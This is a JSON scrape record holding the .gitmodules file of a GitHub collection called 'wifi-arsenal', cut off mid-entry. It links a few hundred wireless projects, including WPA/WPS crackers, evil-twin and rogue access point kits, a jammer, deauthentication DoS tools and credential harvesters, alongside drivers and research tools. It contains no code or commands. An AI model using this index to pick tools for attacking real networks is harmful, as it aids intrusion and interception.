{
  "metadata": {
    "timestamp": 1736710067039,
    "page": 676,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjY4MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "0x90/wifi-arsenal",
      "stars": 1952,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitmodules",
          "type": "blob",
          "size": 56.9560546875,
          "content": "[submodule \"3vilTwinAttacker\"]\n\tpath = 3vilTwinAttacker\n\turl = https://github.com/P0cL4bs/3vilTwinAttacker\n[submodule \"802.11-data\"]\n\tpath = 802.11-data\n\turl = https://github.com/ewa/802.11-data\n[submodule \"802.11p-wireless-regdb\"]\n\tpath = 802.11p-wireless-regdb\n\turl = https://github.com/CTU-IIG/802.11p-wireless-regdb\n[submodule \"80211-fun\"]\n\tpath = 80211-fun\n\turl = https://github.com/flupzor/80211-fun\n[submodule \"acs\"]\n\tpath = acs\n\turl = https://github.com/mcgrof/acs\n[submodule \"aircrack-db\"]\n\tpath = aircrack-db\n\turl = https://github.com/SaltwaterC/aircrack-db\n[submodule \"aircrack-ng\"]\n\tpath = aircrack-ng\n\turl = https://github.com/aircrack-ng/aircrack-ng\n[submodule \"airmode\"]\n\tpath = airmode\n\turl = https://github.com/Frozenbox/airmode\n[submodule \"airodump-iv\"]\n\tpath = airodump-iv\n\turl = https://github.com/ivanlei/airodump-iv\n[submodule \"airport-sniffer\"]\n\tpath = airport-sniffer\n\turl = https://github.com/zhovner/airport-sniffer\n[submodule \"airscan\"]\n\tpath = airscan\n\turl = https://github.com/trou/airscan\n[submodule \"airview\"]\n\tpath = airview\n\turl = https://github.com/Crypt0s/airview\n[submodule \"airxploit\"]\n\tpath = airxploit\n\turl = https://github.com/balle/airxploit\n[submodule \"auto-reaver\"]\n\tpath = auto-reaver\n\turl = https://github.com/0x90/auto-reaver\n[submodule \"badkarma\"]\n\tpath = badkarma\n\turl = https://github.com/atechdad/badkarma\n[submodule \"banjax\"]\n\tpath = banjax\n\turl = https://github.com/0x90/banjax\n[submodule \"basiciw\"]\n\tpath = basiciw\n\turl = https://github.com/enkore/basiciw\n[submodule \"belkin4xx\"]\n\tpath = belkin4xx\n\turl = https://bitbucket.org/dudux/belkin4xx\n[submodule \"bunny\"]\n\tpath = bunny\n\turl = https://github.com/mothran/bunny\n[submodule \"chap2asleap\"]\n\tpath = chap2asleap\n\turl = https://github.com/xiao106347/chap2asleap\n[submodule \"CloudCrackInstaller\"]\n\tpath = CloudCrackInstaller\n\turl = https://github.com/tjetzinger/CloudCrackInstaller\n[submodule \"cookie-monster\"]\n\tpath = cookie-monster\n\turl = https://github.com/0x90/cookie-monster\n[submodule \"cornuprobia\"]\n\tpath = cornuprobia\n\turl = https://github.com/4ZM/cornuprobia\n[submodule \"COUCHFI\"]\n\tpath = COUCHFI\n\turl = https://github.com/calvinmetcalf/COUCHFI\n[submodule \"crda\"]\n\tpath = crda\n\turl = https://github.com/mcgrof/crda\n[submodule \"darm\"]\n\tpath = darm\n\turl = https://github.com/eldraco/darm\n[submodule \"dot11decrypt\"]\n\tpath = dot11decrypt\n\turl = https://github.com/mfontanini/dot11decrypt\n[submodule \"dot11er\"]\n\tpath = dot11er\n\turl = https://github.com/timow/dot11er\n[submodule \"dot11sniffer\"]\n\tpath = dot11sniffer\n\turl = https://github.com/DepthDeluxe/dot11sniffer\n[submodule \"eap_detect\"]\n\tpath = eap_detect\n\turl = https://github.com/Raiton/eap_detect\n[submodule \"eapeak\"]\n\tpath = eapeak\n\turl = https://github.com/securestate/eapeak\n[submodule \"easy-creds\"]\n\tpath = easy-creds\n\turl = https://github.com/brav0hax/easy-creds\n[submodule \"fakeAP\"]\n\tpath = fakeAP\n\turl = https://github.com/DanMcInerney/fakeAP\n[submodule \"fern-wifi-cracker\"]\n\tpath = fern-wifi-cracker\n\turl = https://github.com/0x90/fern-wifi-cracker\n[submodule \"frame-randomizer\"]\n\tpath = frame-randomizer\n\turl = https://github.com/mike-albano/frame-randomizer\n[submodule \"FruityWifi\"]\n\tpath = FruityWifi\n\turl = https://github.com/xtr4nge/FruityWifi\n[submodule \"FuzzAP\"]\n\tpath = FuzzAP\n\turl = https://github.com/lostincynicism/FuzzAP\n[submodule \"FWAP\"]\n\tpath = FWAP\n\turl = https://github.com/szehl/FWAP\n[submodule \"GrapplingHook\"]\n\tpath = GrapplingHook\n\turl = https://github.com/nseetharaman/GrapplingHook\n[submodule \"haiku-wifi\"]\n\tpath = haiku-wifi\n\turl = https://github.com/jedahan/haiku-wifi\n[submodule \"horst\"]\n\tpath = horst\n\turl = https://github.com/br101/horst\n[submodule \"hostapd.py\"]\n\tpath = hostapd.py\n\turl = https://github.com/nims11/hostapd.py\n[submodule \"hostapd-wpe\"]\n\tpath = hostapd-wpe\n\turl = https://github.com/OpenSecurityResearch/hostapd-wpe\n[submodule \"huawei_wifi\"]\n\tpath = huawei_wifi\n\turl = https://github.com/davux/huawei_wifi\n[submodule \"iSniff-GPS\"]\n\tpath = iSniff-GPS\n\turl = https://github.com/hubert3/iSniff-GPS\n[submodule \"karma\"]\n\tpath = karma\n\turl = https://github.com/atimorin/karma\n[submodule \"kismeth2earth\"]\n\tpath = kismeth2earth\n\turl = https://github.com/andreagrandi/kismeth2earth\n[submodule \"LANs.py\"]\n\tpath = LANs.py\n\turl = https://github.com/DanMcInerney/LANs.py\n[submodule \"libcowpatty\"]\n\tpath = libcowpatty\n\turl = https://github.com/adambregenzer/libcowpatty\n[submodule \"libnl\"]\n\tpath = libnl\n\turl = https://github.com/tgraf/libnl\n[submodule \"lorcon\"]\n\tpath = lorcon\n\turl = https://github.com/0x90/lorcon\n[submodule \"ath10k-firmware\"]\n\tpath = ath10k-firmware\n\turl = https://github.com/kvalo/ath10k-firmware\n[submodule \"ath9k-4W-patch\"]\n\tpath = ath9k-4W-patch\n\turl = https://github.com/rboninsegna/ath9k-4W-patch\n[submodule \"ath9k_ath5k_full_permissive_unlock_all_channels.patch\"]\n\tpath = ath9k_ath5k_full_permissive_unlock_all_channels.patch\n\turl = https://github.com/doom5/ath9k_ath5k_full_permissive_unlock_all_channels.patch\n[submodule \"ath9k_caldata\"]\n\tpath = ath9k_caldata\n\turl = https://github.com/Noltari/ath9k_caldata\n[submodule \"ath9k-docs\"]\n\tpath = ath9k-docs\n\turl = https://github.com/erikarn/ath9k-docs\n[submodule \"ath9k_dynack\"]\n\tpath = ath9k_dynack\n\turl = https://github.com/LorenzoBianconi/ath9k_dynack\n[submodule \"ath9k_grt\"]\n\tpath = ath9k_grt\n\turl = https://github.com/valkjsaaa/ath9k_grt\n[submodule \"mac-analyzer\"]\n\tpath = mac-analyzer\n\turl = https://github.com/abnarain/mac-analyzer\n[submodule \"ath9k-nav\"]\n\tpath = ath9k-nav\n\turl = https://github.com/hughobrien/ath9k-nav\n[submodule \"ath9k\"]\n\tpath = ath9k\n\turl = https://github.com/aelam/ath9k\n[submodule \"ath9k-spectral-scan\"]\n\tpath = ath9k-spectral-scan\n\turl = https://github.com/kazikcz/ath9k-spectral-scan\n[submodule \"AtherosROMKit\"]\n\tpath = AtherosROMKit\n\turl = https://github.com/andyvand/AtherosROMKit\n[submodule \"FFT_eval\"]\n\tpath = FFT_eval\n\turl = https://github.com/simonwunderlich/FFT_eval\n[submodule \"open-ath9k-htc-firmware\"]\n\tpath = open-ath9k-htc-firmware\n\turl = https://github.com/qca/open-ath9k-htc-firmware\n[submodule \"qca-swiss-army-knife\"]\n\tpath = qca-swiss-army-knife\n\turl = https://github.com/mcgrof/qca-swiss-army-knife\n[submodule \"RegMon\"]\n\tpath = RegMon\n\turl = https://github.com/thuehn/RegMon\n[submodule \"speccy\"]\n\tpath = speccy\n\turl = https://github.com/bcopeland/speccy\n[submodule \"bcmon\"]\n\tpath = bcmon\n\turl = https://github.com/0x90/bcmon\n[submodule \"BrcmPatchRAM\"]\n\tpath = BrcmPatchRAM\n\turl = https://github.com/the-darkvoid/BrcmPatchRAM\n[submodule \"broadcom-wl-monitormode\"]\n\tpath = broadcom-wl-monitormode\n\turl = https://github.com/timofurrer/broadcom-wl-monitormode\n[submodule \"phystats\"]\n\tpath = phystats\n\turl = https://github.com/ransford/phystats\n[submodule \"OS-X-Realtek-Network\"]\n\tpath = OS-X-Realtek-Network\n\turl = https://github.com/RehabMan/OS-X-Realtek-Network\n[submodule \"rtl8812au\"]\n\tpath = rtl8812au\n\turl = https://github.com/gnab/rtl8812au\n[submodule \"lrc\"]\n\tpath = lrc\n\turl = https://github.com/0x0d/lrc\n[submodule \"MappingWirelessNetworks\"]\n\tpath = MappingWirelessNetworks\n\turl = https://github.com/jeffThompson/MappingWirelessNetworks\n[submodule \"modwifi\"]\n\tpath = modwifi\n\turl = https://github.com/vanhoefm/modwifi\n[submodule \"Native-WiFi-API-Beacon-Sniffer\"]\n\tpath = Native-WiFi-API-Beacon-Sniffer\n\turl = https://github.com/6e726d/Native-WiFi-API-Beacon-Sniffer\n[submodule \"null-packet-wifi-prompt\"]\n\tpath = null-packet-wifi-prompt\n\turl = https://bitbucket.org/edkeeble/null-packet-wifi-prompt\n[submodule \"openrtls\"]\n\tpath = openrtls\n\turl = https://github.com/konker/openrtls\n[submodule \"openwips-ng\"]\n\tpath = openwips-ng\n\turl = https://github.com/0x90/openwips-ng\n[submodule \"pcap2xml\"]\n\tpath = pcap2xml\n\turl = https://github.com/securitytube/pcap2xml\n[submodule \"pixiewps\"]\n\tpath = pixiewps\n\turl = https://github.com/wiire/pixiewps\n[submodule \"probemon\"]\n\tpath = probemon\n\turl = https://github.com/jjb3tee3/probemon\n[submodule \"PwnSTAR\"]\n\tpath = PwnSTAR\n\turl = https://github.com/SilverFoxx/PwnSTAR\n[submodule \"py80211\"]\n\tpath = py80211\n\turl = https://github.com/0x90/py80211\n[submodule \"pykismetstats\"]\n\tpath = pykismetstats\n\turl = https://github.com/0x90/pykismetstats\n[submodule \"pylorcon2\"]\n\tpath = pylorcon2\n\turl = https://github.com/tom5760/pylorcon2\n[submodule \"python-radiotap\"]\n\tpath = python-radiotap\n\turl = https://github.com/bcopeland/python-radiotap\n[submodule \"pythonwifi\"]\n\tpath = pythonwifi\n\turl = http://git.tuxfamily.org/pythonwifi/pythonwifi.git\n[submodule \"PyWiWi\"]\n\tpath = PyWiWi\n\turl = https://github.com/6e726d/PyWiWi\n[submodule \"Radioparse\"]\n\tpath = Radioparse\n\turl = https://github.com/AlexanderSelzer/Radioparse\n[submodule \"reaver-wps\"]\n\tpath = reaver-wps\n\turl = https://github.com/gabrielrcouto/reaver-wps\n[submodule \"reaver-wps-fork-t6x\"]\n\tpath = reaver-wps-fork-t6x\n\turl = https://github.com/t6x/reaver-wps-fork-t6x\n[submodule \"Rspoof\"]\n\tpath = Rspoof\n\turl = https://github.com/zackiles/Rspoof\n[submodule \"rssi\"]\n\tpath = rssi\n\turl = https://github.com/AravinthPanch/rssi\n[submodule \"scapy-fakeap\"]\n\tpath = scapy-fakeap\n\turl = https://github.com/rpp0/scapy-fakeap\n[submodule \"scapy-rssi\"]\n\tpath = scapy-rssi\n\turl = https://github.com/azz2k/scapy-rssi\n[submodule \"scapy-survey\"]\n\tpath = scapy-survey\n\turl = https://github.com/tuomasb/scapy-survey\n[submodule \"Scapy-wireless-scanner\"]\n\tpath = Scapy-wireless-scanner\n\turl = https://github.com/rs91092/Scapy-wireless-scanner\n[submodule \"skybluetero\"]\n\tpath = skybluetero\n\turl = https://github.com/0x90/skybluetero\n[submodule \"snifflab\"]\n\tpath = snifflab\n\turl = https://github.com/andrewhilts/snifflab\n[submodule \"sniffMyPackets\"]\n\tpath = sniffMyPackets\n\turl = https://github.com/catalyst256/sniffMyPackets.git\n[submodule \"snoopy-ng\"]\n\tpath = snoopy-ng\n\turl = https://github.com/sensepost/snoopy-ng\n[submodule \"waidps\"]\n\tpath = waidps\n\turl = https://github.com/SYWorks/waidps\n[submodule \"wallofshame\"]\n\tpath = wallofshame\n\turl = https://github.com/0x0d/wallofshame\n[submodule \"WAPMap\"]\n\tpath = WAPMap\n\turl = https://github.com/hack1thu7ch/WAPMap\n[submodule \"warcarrier\"]\n\tpath = warcarrier\n\turl = https://github.com/0x90/warcarrier\n[submodule \"Watcher\"]\n\tpath = Watcher\n\turl = https://github.com/catalyst256/Watcher.git\n[submodule \"wifi\"]\n\tpath = wifi\n\turl = https://github.com/rockymeza/wifi\n[submodule \"wifi-contour\"]\n\tpath = wifi-contour\n\turl = https://github.com/bertabus/wifi-contour\n[submodule \"wifi-default-password\"]\n\tpath = wifi-default-password\n\turl = https://bitbucket.org/jpgerek/wifi-default-password\n[submodule \"wifi-dump-analysis\"]\n\tpath = wifi-dump-analysis\n\turl = https://github.com/abnarain/wifi-dump-analysis\n[submodule \"wifi_dump_parser-v3\"]\n\tpath = wifi_dump_parser-v3\n\turl = https://github.com/abnarain/wifi_dump_parser-v3\n[submodule \"wifi-harvester\"]\n\tpath = wifi-harvester\n\turl = https://github.com/SYWorks/wifi-harvester\n[submodule \"wifi-heatmap\"]\n\tpath = wifi-heatmap\n\turl = https://github.com/beaugunderson/wifi-heatmap\n[submodule \"wifi-linux\"]\n\tpath = wifi-linux\n\turl = https://github.com/dixel/wifi-linux\n[submodule \"wifi-locator\"]\n\tpath = wifi-locator\n\turl = https://github.com/clockfort/wifi-locator\n[submodule \"wifi-scan\"]\n\tpath = wifi-scan\n\turl = https://bitbucket.org/edkeeble/wifi-scan\n[submodule \"wifi_geolocation\"]\n\tpath = wifi_geolocation\n\turl = https://github.com/genekogan/wifi_geolocation\n[submodule \"wifi_localization\"]\n\tpath = wifi_localization\n\turl = https://github.com/utexas-air-fri/wifi_localization\n[submodule \"wifidec\"]\n\tpath = wifidec\n\turl = https://github.com/twitchyliquid64/wifidec\n[submodule \"wifijammer\"]\n\tpath = wifijammer\n\turl = https://github.com/DanMcInerney/wifijammer\n[submodule \"wifimonster\"]\n\tpath = wifimonster\n\turl = https://github.com/flankerhqd/wifimonster\n[submodule \"wifiphisher\"]\n\tpath = wifiphisher\n\turl = https://github.com/sophron/wifiphisher\n[submodule \"WifiScanAndMap\"]\n\tpath = WifiScanAndMap\n\turl = https://github.com/cyberpython/WifiScanAndMap\n[submodule \"wifitap\"]\n\tpath = wifitap\n\turl = https://github.com/viscousliquid/wifitap\n[submodule \"wifite\"]\n\tpath = wifite\n\turl = https://github.com/derv82/wifite\n[submodule \"wifite-mod-pixiewps\"]\n\tpath = wifite-mod-pixiewps\n\turl = https://github.com/aanarchyy/wifite-mod-pixiewps\n[submodule \"wifivis\"]\n\tpath = wifivis\n\turl = https://github.com/mitdbg/wifivis\n[submodule \"wifiwho\"]\n\tpath = wifiwho\n\turl = https://github.com/meeuw/wifiwho\n[submodule \"wifresti\"]\n\tpath = wifresti\n\turl = https://github.com/LionSec/wifresti\n[submodule \"wifuzz\"]\n\tpath = wifuzz\n\turl = https://github.com/0x90/wifuzz\n[submodule \"wifuzzit\"]\n\tpath = wifuzzit\n\turl = https://github.com/0xd012/wifuzzit\n[submodule \"wifi_decode\"]\n\tpath = wifi_decode\n\turl = https://github.com/cmpxchg8/wifi_decode\n[submodule \"wipi\"]\n\tpath = wipi\n\turl = https://github.com/dioh/wipi\n[submodule \"wireless_half-mini\"]\n\tpath = wireless_half-mini\n\turl = https://github.com/toleda/wireless_half-mini\n[submodule \"wireless-ids\"]\n\tpath = wireless-ids\n\turl = https://github.com/SYWorks/wireless-ids\n[submodule \"wireless-radar\"]\n\tpath = wireless-radar\n\turl = https://github.com/stef/wireless-radar\n[submodule \"wireless-regdb\"]\n\tpath = wireless-regdb\n\turl = https://github.com/0x90/wireless-regdb\n[submodule \"Wireless-Sniffer\"]\n\tpath = Wireless-Sniffer\n\turl = https://github.com/gauravpatwardhan/Wireless-Sniffer\n[submodule \"WirelessConfig\"]\n\tpath = WirelessConfig\n\turl = https://github.com/acidprime/WirelessConfig\n[submodule \"WLAN-Monitoring\"]\n\tpath = WLAN-Monitoring\n\turl = https://github.com/sajjanbh/WLAN-Monitoring\n[submodule \"wlan-pos\"]\n\tpath = wlan-pos\n\turl = https://github.com/0x90/wlan-pos\n[submodule \"wlan-stats\"]\n\tpath = wlan-stats\n\turl = https://github.com/hughobrien/wlan-stats\n[submodule \"wmd\"]\n\tpath = wmd\n\turl = https://github.com/securestate/wmd\n[submodule \"wmon\"]\n\tpath = wmon\n\turl = https://github.com/wmon/wmon\n[submodule \"wpa-bruteforcer\"]\n\tpath = wpa-bruteforcer\n\turl = https://github.com/SYWorks/wpa-bruteforcer\n[submodule \"WPA2-HalfHandshake-Crack\"]\n\tpath = WPA2-HalfHandshake-Crack\n\turl = https://github.com/dxa4481/WPA2-HalfHandshake-Crack\n[submodule \"wperf\"]\n\tpath = wperf\n\turl = https://github.com/anyfi/wperf\n[submodule \"wps\"]\n\tpath = wps\n\turl = https://github.com/devttys0/wps\n[submodule \"wps-scripts\"]\n\tpath = wps-scripts\n\turl = https://github.com/0x90/wps-scripts\n[submodule \"wpscrack\"]\n\tpath = wpscrack\n\turl = https://github.com/ml31415/wpscrack\n[submodule \"wpsoffline\"]\n\tpath = wpsoffline\n\turl = https://bitbucket.org/dudux/wpsoffline\n[submodule \"wraith\"]\n\tpath = wraith\n\turl = https://github.com/wraith-wireless/wraith\n[submodule \"wspy\"]\n\tpath = wspy\n\turl = https://github.com/Nan-Do/wspy\n[submodule \"wtf\"]\n\tpath = wtf\n\turl = https://github.com/cozybit/wtf\n[submodule \"RTL8188-hostapd\"]\n\tpath = RTL8188-hostapd\n\turl = https://github.com/jenssegers/RTL8188-hostapd\n[submodule \"monit-hostapd\"]\n\tpath = monit-hostapd\n\turl = https://github.com/fabiocannizzo/monit-hostapd\n[submodule \"DebAPoint\"]\n\tpath = DebAPoint\n\turl = https://github.com/joseccnet/DebAPoint\n[submodule \"hostapd-karma\"]\n\tpath = hostapd-karma\n\turl = https://github.com/xtr4nge/hostapd-karma\n[submodule \"wifisoftap\"]\n\tpath = wifisoftap\n\turl = https://github.com/coolshou/wifisoftap\n[submodule \"hostapd-wpe-openwrt\"]\n\tpath = hostapd-wpe-openwrt\n\turl = https://github.com/TarlogicSecurity/hostapd-wpe-openwrt\n[submodule \"hostapd-ap6210\"]\n\tpath = hostapd-ap6210\n\turl = https://github.com/Bananian/hostapd-ap6210\n[submodule \"RougeDetection\"]\n\tpath = RougeDetection\n\turl = https://github.com/bagsofnarcissism/RougeDetection\n[submodule \"apbleed\"]\n\tpath = apbleed\n\turl = https://github.com/vanhoefm/apbleed\n[submodule \"IndoorPositionr\"]\n\tpath = IndoorPositionr\n\turl = https://github.com/otherview/IndoorPositionr\n[submodule \"probecap\"]\n\tpath = probecap\n\turl = https://github.com/hydrogen18/probecap\n[submodule \"airown\"]\n\tpath = airown\n\turl = https://github.com/sh0/airown\n[submodule \"packetvector\"]\n\tpath = packetvector\n\turl = https://github.com/derosier/packetvector\n[submodule \"ADSLPT-WPA\"]\n\tpath = ADSLPT-WPA\n\turl = https://github.com/AndrewGomes/ADSLPT-WPA\n[submodule \"airodump-logger\"]\n\tpath = airodump-logger\n\turl = https://github.com/atiti/airodump-logger\n[submodule \"txpower_RTL8187\"]\n\tpath = txpower_RTL8187\n\turl = https://github.com/Demontager/txpower\n[submodule \"pythonAir\"]\n\tpath = pythonAir\n\turl = https://github.com/Slickness/pythonAir\n[submodule \"hostapd-rtl871xdrv\"]\n\tpath = hostapd-rtl871xdrv\n\turl = https://github.com/pritambaral/hostapd-rtl871xdrv\n[submodule \"hostapd-rtl\"]\n\tpath = hostapd-rtl\n\turl = https://github.com/jekader/hostapd-rtl\n[submodule \"WPA_DECRYPTION_MPI\"]\n\tpath = WPA_DECRYPTION_MPI\n\turl = https://github.com/shagrath89m/WPA_DECRYPTION_MPI\n[submodule \"Auto-Airodump-NG\"]\n\tpath = Auto-Airodump-NG\n\turl = https://github.com/JackAHall/Auto-Airodump-NG\n[submodule \"reaver-webui\"]\n\tpath = reaver-webui\n\turl = https://github.com/fopina/reaver-webui\n[submodule \"AtEar\"]\n\tpath = AtEar\n\turl = https://github.com/NORMA-Inc/AtEar\n[submodule \"wpa-autopwn\"]\n\tpath = wpa-autopwn\n\turl = https://github.com/vnik5287/wpa-autopwn\n[submodule \"datasamalen\"]\n\tpath = datasamalen\n\turl = https://github.com/4ZM/datasamalen\n[submodule \"scapybase\"]\n\tpath = scapybase\n\turl = https://github.com/jahrome/scapybase\n[submodule \"mitm_rogue_wifi_ap\"]\n\tpath = mitm_rogue_wifi_ap\n\turl = https://github.com/wshen0123/mitm_rogue_wifi_ap\n[submodule \"openCAPWAP\"]\n\tpath = openCAPWAP\n\turl = https://github.com/vollero/openCAPWAP\n[submodule \"RT73-USB-Wireless-\"]\n\tpath = RT73-USB-Wireless-\n\turl = https://github.com/Marchrius/RT73-USB-Wireless-\n[submodule \"atheros-patches\"]\n\tpath = atheros-patches\n\turl = https://github.com/zeplios/atheros-patches\n[submodule \"ath-info\"]\n\tpath = ath-info\n\turl = https://github.com/mickflemm/ath-info\n[submodule \"fixsum\"]\n\tpath = fixsum\n\turl = https://github.com/joycechu/fixsum\n[submodule \"atheros_library\"]\n\tpath = atheros_library\n\turl = https://github.com/Noltari/atheros_library\n[submodule \"py_DD_WRT_Remote_Mac_Adder\"]\n\tpath = py_DD_WRT_Remote_Mac_Adder\n\turl = https://github.com/mzhaase/py_DD_WRT_Remote_Mac_Adder\n[submodule \"ap51flash\"]\n\tpath = ap51flash\n\turl = https://github.com/cl4u2/ap51flash\n[submodule \"ath9k-htc-firmware-blob\"]\n\tpath = ath9k-htc-firmware-blob\n\turl = https://github.com/olerem/ath9k-htc-firmware-blob\n[submodule \"modwifi-tools\"]\n\tpath = modwifi-tools\n\turl = https://github.com/vanhoefm/modwifi-tools\n[submodule \"VX\"]\n\tpath = VX\n\turl = https://github.com/hellais/VX\n[submodule \"PiWAT2\"]\n\tpath = PiWAT2\n\turl = https://github.com/Crypt0s/PiWAT\n[submodule \"Burgess\"]\n\tpath = Burgess\n\turl = https://github.com/Jtfinlay/Burgess\n[submodule \"aircrack-bws\"]\n\tpath = aircrack-bws\n\turl = https://github.com/jesseDtucker/aircrack-bws\n[submodule \"mt76\"]\n\tpath = mt76\n\turl = https://github.com/openwrt/mt76\n[submodule \"mt7601u\"]\n\tpath = mt7601u\n\turl = https://github.com/kuba-moo/mt7601u\n[submodule \"mwlwifi\"]\n\tpath = mwlwifi\n\turl = https://github.com/kaloz/mwlwifi\n[submodule \"wifi_beacons\"]\n\tpath = wifi_beacons\n\turl = https://github.com/abnarain/wifi_beacons\n[submodule \"oculus\"]\n\tpath = oculus\n\turl = https://github.com/abnarain/oculus\n[submodule \"covert_channel\"]\n\tpath = covert_channel\n\turl = https://github.com/abnarain/covert_channel\n[submodule \"wifi_dump-tmpfs\"]\n\tpath = wifi_dump-tmpfs\n\turl = https://github.com/abnarain/wifi_dump-tmpfs\n[submodule \"wireless-info\"]\n\tpath = wireless-info\n\turl = https://github.com/wlanslovenija/wireless-info\n[submodule \"make-a-new-mac80211-to-wirelessAP\"]\n\tpath = make-a-new-mac80211-to-wirelessAP\n\turl = https://github.com/fhector/make-a-new-mac80211-to-wirelessAP\n[submodule \"setbssid\"]\n\tpath = setbssid\n\turl = https://github.com/sheenhx/setbssid\n[submodule \"iitis-generator\"]\n\tpath = iitis-generator\n\turl = https://github.com/iitis/iitis-generator\n[submodule \"CloudMAC-Misc\"]\n\tpath = CloudMAC-Misc\n\turl = https://github.com/Kanel/CloudMAC-Misc\n[submodule \"wi-finder\"]\n\tpath = wi-finder\n\turl = https://github.com/romebop/wi-finder\n[submodule \"mr-nosy\"]\n\tpath = mr-nosy\n\turl = https://github.com/jgumbley/mr-nosy\n[submodule \"wifitracker\"]\n\tpath = wifitracker\n\turl = https://github.com/DHNishi/wifitracker\n[submodule \"airfree-wt\"]\n\tpath = airfree-wt\n\turl = https://github.com/rednaks/airfree-wt\n[submodule \"sigmon\"]\n\tpath = sigmon\n\turl = https://github.com/terbo/sigmon\n[submodule \"WiFi-Rifle\"]\n\tpath = WiFi-Rifle\n\turl = https://github.com/sensepost/WiFi-Rifle\n[submodule \"terUNIFI\"]\n\tpath = terUNIFI\n\turl = https://github.com/termax/terUNIFI\n[submodule \"emc-contest-data-visualization\"]\n\tpath = emc-contest-data-visualization\n\turl = https://github.com/frankxu2004/emc-contest-data-visualization\n[submodule \"lianwifi\"]\n\tpath = lianwifi\n\turl = https://github.com/5alt/lianwifi\n[submodule \"libairpcap-nl\"]\n\tpath = libairpcap-nl\n\turl = https://github.com/hbock/libairpcap-nl\n[submodule \"wireless-rool-nodejs\"]\n\tpath = wireless-rool-nodejs\n\turl = https://github.com/bakerface/wireless-tools\n[submodule \"airtraf\"]\n\tpath = airtraf\n\turl = https://github.com/saintkepha/airtraf\n[submodule \"cac\"]\n\tpath = cac\n\turl = https://github.com/paulpatras/cac\n[submodule \"madwifi-be\"]\n\tpath = madwifi-be\n\turl = https://github.com/paulpatras/madwifi-be\n[submodule \"Blackbox\"]\n\tpath = Blackbox\n\turl = https://github.com/twitchyliquid64/Blackbox\n[submodule \"list-aps\"]\n\tpath = list-aps\n\turl = https://github.com/jiixyj/list-aps\n[submodule \"liber80211\"]\n\tpath = liber80211\n\turl = https://github.com/brycethomas/liber80211\n[submodule \"80211ping\"]\n\tpath = 80211ping\n\turl = https://github.com/tillwo/80211ping\n[submodule \"wifi-beeper\"]\n\tpath = wifi-beeper\n\turl = https://github.com/tillwo/wifi-beeper\n[submodule \"gopacket-80211\"]\n\tpath = gopacket-80211\n\turl = https://github.com/dutchcoders/gopacket-80211\n[submodule \"80211scrambler\"]\n\tpath = 80211scrambler\n\turl = https://github.com/travisgoodspeed/80211scrambler\n[submodule \"80211mgmtDoS\"]\n\tpath = 80211mgmtDoS\n\turl = https://github.com/phildom/80211mgmtDoS\n[submodule \"brcm80211-trace-cmd\"]\n\tpath = brcm80211-trace-cmd\n\turl = https://github.com/arend/brcm80211-trace-cmd\n[submodule \"80211_raw\"]\n\tpath = 80211_raw\n\turl = https://github.com/MinimumLaw/80211_raw\n[submodule \"80211p_raw\"]\n\tpath = 80211p_raw\n\turl = https://github.com/allanmatthew/80211p_raw\n[submodule \"pcap80211analyzer\"]\n\tpath = pcap80211analyzer\n\turl = https://github.com/enukane/pcap80211analyzer\n[submodule \"agentapd\"]\n\tpath = agentapd\n\turl = https://github.com/mengning/agentapd\n[submodule \"cloudap\"]\n\tpath = cloudap\n\turl = https://github.com/mengning/cloudap\n[submodule \"wifidog-gateway\"]\n\tpath = wifidog-gateway\n\turl = https://github.com/wifidog/wifidog-gateway\n[submodule \"remoteapd\"]\n\tpath = remoteapd\n\turl = https://github.com/mengning/remoteapd\n[submodule \"frame-utils.js\"]\n\tpath = frame-utils.js\n\turl = https://github.com/rhodey/frame-utils.js\n[submodule \"ciscowebauth\"]\n\tpath = ciscowebauth\n\turl = https://github.com/darizotas/ciscowebauth\n[submodule \"ath10k-mesh\"]\n\tpath = ath10k-mesh\n\turl = https://github.com/bcopeland/ath10k-mesh\n[submodule \"android_packetspammer\"]\n\tpath = android_packetspammer\n\turl = https://github.com/bcopeland/android_packetspammer\n[submodule \"android_iw\"]\n\tpath = android_iw\n\turl = https://github.com/bcopeland/android_iw\n[submodule \"radioparse\"]\n\tpath = radioparse\n\turl = https://github.com/AlexanderSelzer/radioparse\n[submodule \"packet-injector\"]\n\tpath = packet-injector\n\turl = https://github.com/juzna/packet-injector\n[submodule \"fRobot\"]\n\tpath = fRobot\n\turl = https://github.com/sail308/fRobot\n[submodule \"rogueDetect\"]\n\tpath = rogueDetect\n\turl = https://github.com/olanb7/rogueDetect\n[submodule \"naive_project\"]\n\tpath = naive_project\n\turl = https://github.com/veenfang/naive_project\n[submodule \"PCS\"]\n\tpath = PCS\n\turl = https://github.com/gvnn3/PCS\n[submodule \"packetparser\"]\n\tpath = packetparser\n\turl = https://github.com/flupzor/packetparser\n[submodule \"wifite2\"]\n\tpath = wifite2\n\turl = https://github.com/derv82/wifite2\n[submodule \"wpacrack\"]\n\tpath = wpacrack\n\turl = https://github.com/derv82/wpacrack\n[submodule \"Hostapd-with-WebID\"]\n\tpath = Hostapd-with-WebID\n\turl = https://github.com/yunus/Hostapd-with-WebID\n[submodule \"Wps-Ultimate-Cracker\"]\n\tpath = Wps-Ultimate-Cracker\n\turl = https://github.com/younextvictim/Wps-Ultimate-Cracker\n[submodule \"HT-WPS-Breaker\"]\n\tpath = HT-WPS-Breaker\n\turl = https://github.com/SilentGhostX/HT-WPS-Breaker\n[submodule \"android_reaver-wps\"]\n\tpath = android_reaver-wps\n\turl = https://github.com/kriswebdev/android_reaver-wps\n[submodule \"reaver-ui\"]\n\tpath = reaver-ui\n\turl = https://github.com/deoxxa/reaver-ui\n[submodule \"greaver\"]\n\tpath = greaver\n\turl = https://github.com/sigginet/greaver\n[submodule \"phpreaver\"]\n\tpath = phpreaver\n\turl = https://github.com/phpreaver/phpreaver\n[submodule \"AutoPixieWps\"]\n\tpath = AutoPixieWps\n\turl = https://github.com/nxxxu/AutoPixieWps\n[submodule \"penetrator-wps\"]\n\tpath = penetrator-wps\n\turl = https://github.com/xXx-stalin-666-money-xXx/penetrator-wps\n[submodule \"pixiewps-android\"]\n\tpath = pixiewps-android\n\turl = https://github.com/ru-faraon/pixiewps-android\n[submodule \"pyxiewps\"]\n\tpath = pyxiewps\n\turl = https://github.com/jgilhutton/pyxiewps\n[submodule \"captiveportal\"]\n\tpath = captiveportal\n\turl = https://github.com/bendemott/captiveportal\n[submodule \"AirLibre\"]\n\tpath = AirLibre\n\turl = https://github.com/nathanshimp/AirLibre\n[submodule 